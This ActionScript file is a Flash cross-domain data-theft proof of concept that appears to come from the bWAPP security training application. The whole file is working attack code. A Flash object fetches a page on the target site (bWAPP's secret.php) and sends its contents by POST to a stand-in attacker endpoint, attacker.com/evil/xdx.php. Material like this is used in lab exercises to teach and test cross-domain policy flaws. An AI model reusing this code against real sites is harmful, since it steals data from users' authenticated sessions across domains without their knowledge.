// Author: Gursev Singh Kalra (gursev.kalra@foundstone.com)
// Customizations by Malik Mesellem (malik@itsecgames.com)
// xdx.as
// Thanks - http://help.adobe.com/en_US/as3/dev/WS5b3ccc516d4fbf351e63e3d118a9b90204-7cfd.html#WS5b3ccc516d4fbf351e63e3d118a9b90204-7cf5
package {
	import flash.display.Sprite;
	import flash.events.*;
	import flash.net.URLRequestMethod;
	import flash.net.URLRequest;
	import flash.net.URLVariables;
	import flash.net.URLLoader;

	public class xdx extends Sprite {
		public function xdx() {
			// Target URL from where the data is to be retrieved
			var readFrom:String = "http://itsecgames.com/bWAPP/secret.php";
			var readRequest:URLRequest = new URLRequest(readFrom);
			var getLoader:URLLoader = new URLLoader();
			getLoader.addEventListener(Event.COMPLETE, eventHandler);
			try {
				getLoader.load(readRequest);
			} catch (error:Error) {
				trace("Error loading URL: " + error);
			}
		}

		private function eventHandler(event:Event):void {
			// URL to which retrieved data is to be sent
			var sendTo:String = "http://attacker.com/evil/xdx.php"
			var sendRequest:URLRequest = new URLRequest(sendTo);
			var variables:URLVariables = new URLVariables();
			variables.data = event.target.data;
			sendRequest.method = URLRequestMethod.POST;
			sendRequest.data = variables;
			var sendLoader:URLLoader = new URLLoader();
			try {
				sendLoader.load(sendRequest);
			} catch (error:Error) {
				trace("Error loading URL: " + error);
			}
		}
	}
}